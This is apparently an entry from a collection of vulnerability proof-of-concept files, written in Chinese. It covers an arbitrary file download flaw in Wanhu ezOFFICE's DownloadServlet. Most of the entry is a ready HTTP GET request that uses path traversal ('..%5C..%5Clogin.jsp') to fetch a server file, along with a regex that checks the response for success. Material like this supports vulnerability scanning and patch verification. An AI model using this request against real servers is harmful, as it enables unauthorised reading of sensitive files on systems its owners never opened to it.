﻿# 万户 ezOFFICE DownloadServlet 存在任意文件下载漏洞

> 更新时间：2023-12-04

> 漏洞编号：

> 漏洞说明：北京万户网络技术有限公司ezOFFICE DownloadServlet 存在任意文件下载漏洞，攻击者可利用该漏洞获取系统敏感信息。

> 漏洞特征：

> 验证脚本：HTTP

```
GET /defaultroot/DownloadServlet?modeType=2&path=html&FileName=..%5C..%5Clogin.jsp&name=123&fiewviewdownload=2&cd=inline&downloadAll=2 HTTP/1.1
```

> 响应代码特征：-1

> 响应内容特征：^(?=.*?request.getParameter)(?=.*?logoindexpicaccName).*?$

> 上传文件定位：

> 验证文件来源：万户 OA DownloadServlet 存在任意文件下载漏洞.poc
